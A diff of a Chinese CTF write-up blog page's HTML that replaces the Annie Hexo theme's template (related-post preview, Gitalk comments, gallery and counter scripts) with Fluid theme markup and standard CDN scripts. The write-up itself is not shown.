-							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">
-								PolarCTF2024夏季个人挑战赛全wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								六月 10日, 2024				
-							</p>
-							<p class="relate-post-content">
-								扫扫看不用扫，猜测是flag.php
-
-
-flag{094c9cc14068a7d18ccd0dd3606e532f}
-
-debudaoflag在cookie里：
-
-
-flag{72077a55w312584wb1aaa88888cd...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛全wp"/>
-							</a>
-						</div>
-					</li>												
-			
-		</ul>
-	
-</div>	
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-comment">
-
-	
-
-		
-
-			<!-- gitalk comment -->
-			<!-- show gitalk comment -->
-<div id="gitalk-container"></div>
-
-<!-- gitalk`s css & js -->
-<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-<link rel="stylesheet" href="/css/comment.css">
-<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
-<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-<script type="text/javascript">
-
-	(function gitalkComment(){
-		//Thanks O-R
-		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
-		//去除尾部匹配正则数组的字符串  
-		//Remove redundant characters
-		String.prototype.trimEnd = function(regStr) {
-			let result = this;
-			if(regStr == undefined || regStr == null || regStr == "") {
-				return result;
-			}
-			let array = regStr.split(',');
-
-			if(array.length > 0) {
-
-				let c = array.shift(), 
-					str = this,
-					i = str.length,
-					rg = new RegExp(c),
-					matchArr = str.match(rg);
-
-				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
-					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
-						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
-						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
-						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
-						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
-						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
-						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
-						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
-					matchStr = matchStr + '$';
-					result = str.replace(new RegExp(matchStr), "");
-				}
-
-				if(array.length > 0) {
-					return result.trimEnd(array.join())
-				} else {
-					return result;
-				}
-			}
-		};
-
-		//Create gitalk
-		let gitalk = new Gitalk({
-			clientID: '333--',
-			clientSecret: '333--',
-			//id: window.location.pathname,
-			//id: decodeURI(window.location.pathname),
-			//id: (window.location.pathname).split("/").pop().substring(0, 49),
-			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
-			repo: 'annie-gitalk',
-			owner: 'Sariay',
-			admin: 'Sariay',
-			distractionFreeMode: 'true',
-		})
-		gitalk.render('gitalk-container');		
-	})();
-</script>
-
-		
-		
-	
-
-</div>
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-share">
-	
-	
-
-		
-			
-			<!-- socialShare share -->
-			<div class="social-share"></div>
-
-<!--  css & js -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
-<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-			
-		
-		
-	
-</div>
-
-
-				</div>
-			</div>	
-		</div>
-	</div>
-</div>
-
-<!-- show math formula -->
-
-
-
-	 
-	
-<script src="/plugin/clipboard/clipboard.js"></script>
-
-	<script>
-		// Copy code !
-	    function preprocessing() {
-	        $("#article-content .highlight").each(function() {
-	            $(this).wrap('<div id="post-code"></div>');
-	        })
-
-	        $("#article-content #post-code").each(function() {
-	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
-	        })
-
-	        $("#article-content .copy-nav").each(function() {
-	            let languageClass = $(this).next().attr('class'),
-	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
-
-	            $(this).find('.code-language').text(language);
-	            $(this).append('<span class="copy-btn icon-paste"></span>');
-	        });
-	    }
-
-		function copy() {
-		    $('#article-content #post-code').each(function(i) {
-		        let codeCopyId = 'codeCopy-' + i;
-
-		        let codeNode = $(this).find('.code'),
-		            copyButton = $(this).find('.copy-btn');
-
-		        codeNode.attr('id', codeCopyId);
-		        copyButton.attr('data-clipboard-target-id', codeCopyId);
-		    })
-   
-			let clipboard = new ClipboardJS('.copy-btn', {
-					target: function(trigger) {
-						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
-					}
-		      	});
-
-			//pure js
-			function showTooltip(elem, msg) {		   
-				elem.setAttribute('aria-label', msg);
-				elem.setAttribute('class', 'copy-btn icon-clipboard1');
-				setTimeout(function() {
-					elem.setAttribute('class', 'copy-btn icon-paste');
-				}, 2000);
-			}
-
-			clipboard.on('success', function(e) {
-			    e.clearSelection();
-			    console.info('Action:', e.action);		   
-			    console.info('Trigger:', e.trigger);
-			    showTooltip(e.trigger, 'Copied!');   
-			});
-			
-			clipboard.on('error', function(e) {
-			    console.error('Action:', e.action);
-			    console.error('Trigger:', e.trigger);
-			});
-		}
-		
-		(function copyCode(){
-			if ($('.layout-post').length) {
-			    preprocessing();
-			    copy();
-			} 
-		})();
-	</script>
-
-
-
-
-
-
-<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
-
-
-<script src="/plugin/fancybox/jquery.fancybox.js"></script>
-
-
-<script type="text/javascript">
-	(function gallerySet(){
-		let titleID = $('.article-title a'),
-			imageID = $('.article-content img'),
-			videoID = $('.article-content video');
-		
-		let postTitle = titleID.text() ? titleID.text() : "No post title!";
-		
-		imageID.each(function() {
-			let imgPath = $(this).attr('src'),
-				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
-		
-			//给每个匹配的<img>元素打包, 即添加父元素<a>
-			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
-		});
-		
-		videoID.each(function() {
-			let videoPath = $(this).attr('src');
-		
-			//给每个匹配的<img>元素打包, 即添加父元素<a>
-			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
-		});
-		
-		//TODO：支持html5 video
-
-		if($('#layout-post').length) {
-			$('[data-fancybox="gallery"]').fancybox({
-				loop: true,
-				buttons: [
-					"zoom",
-					"share",
-					"slideShow",
-					"fullScreen",
-					//"download",
-					"thumbs",
-					"close"
-				],
-				protect: true
-			});
-		}
-	})();
-</script>
-		</main>
-
-		<!--footer-->
-		<footer>
-	<div id="navigation-show">
-		<ul id="global-nav">
-	
-		<li class="menu-home">
-			<a href="/" class="menu-item-home" target="_blank">主页</a>
-		</li>
-		
-	
-		<li class="menu-archive">
-			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
-		</li>
-		
-	
-		<li class="menu-categories">
-			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
-		</li>
-		
-	
-		<li class="menu-tags">
-			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
-		</li>
-		
-	
-		<li class="menu-Friends!">
-			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
-		</li>
-		
-	
-		<li class="menu-gallery">
-			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
-		</li>
-		
-	
-
-	
-</ul>
-	</div>
-
-	<div class="copyright">
-		<p>
-			 
-				&copy;2024 - 2025, content by Infernity. All Rights Reserved.
-			
-			
-				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
-			
-		</p>
-		<p>
-			
-
-	<!-- busuanzi -->
-	<!-- busuanzi -->
-
-		
-	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-	
-
-		<span id="busuanzi_container_page_pv">
-	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
-		</span>
-
-	
-
-
-
-
-			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
-			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
-		</p>
-	</div>		
-</footer>
-		
-	<!-- Local or hitokoto! -->
-
-	
-<script src="/plugin/motto/motto.js"></script>
-
-	
-	<script type="text/javascript">
-		(function motto(){
-			let mottoText = getMingYanContent().split('</br> - </br>'),
-			
-			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
-			
-			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
-			
-			mottoTextContent = mottoTextContent.trim().substring(0, 100);
-		
-			$("#motto-content").html( mottoTextContent);
-			$("#motto-author").html( mottoTextFrom  );
-		})();	
-	</script>	
-
-
-
-<!-- love effect -->
-
-	
-<script src="/plugin/love/love.js"></script>
-
-
-
-<!-- back to top -->
-
-	<div id="totop">
-	<span class="icon-circle-up"></span>
-</div>
-
-
-
-<!-- site analysis -->
-
-
-	<!-- site-analysis -->
-	
-	
-	
-	
-	
- 
-
-<!-- leancloud -->
-
-
-	<!-- leancloud -->
-	<!--
-	时间：2018-11-27
-	描述：
-		文章访问量：visitors
-		文章喜欢量：likes	
-		文章排行榜：topNPost
-		其他得说明：
-			01-Cookie相关的函数 
-				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
-			02-visitors相关的函数 
-				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
-				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
-			03-topNPost相关的函数
-				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
-			04-likes相关的函数，
-				参考了01 & 02进行简单的设计与实现
--->
-
-
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
   
-<script src="/plugin/leancloud/av-min.js"></script>
-<script src="/js/leancloud-count.js"></script>
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WPs/" class="category-chain-item">WPs</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WPs/" class="print-no-link">#WPs</a>
+      
+    </div>
+  
+</div>
 
 
-	
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024春秋杯部分wp</div>
+      <div>http://example.com/2024/07/06/2024春秋杯/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Infernity</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2024第七届巅峰极客部分wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">
+                        <span class="hidden-mobile">PolarCTF2024夏季个人挑战赛全wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
 
   
 
 
 
-<script src="/plugin/chinese/chinese.js"></script>
-<script src="/plugin/imagelazyloader/yall.min.js"></script>
-<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
-<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
-<script src="/plugin/resizediv/resizediv.js"></script>
-<script src="/js/main.js"></script>
+  
 
-	</body>	
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
 </html>
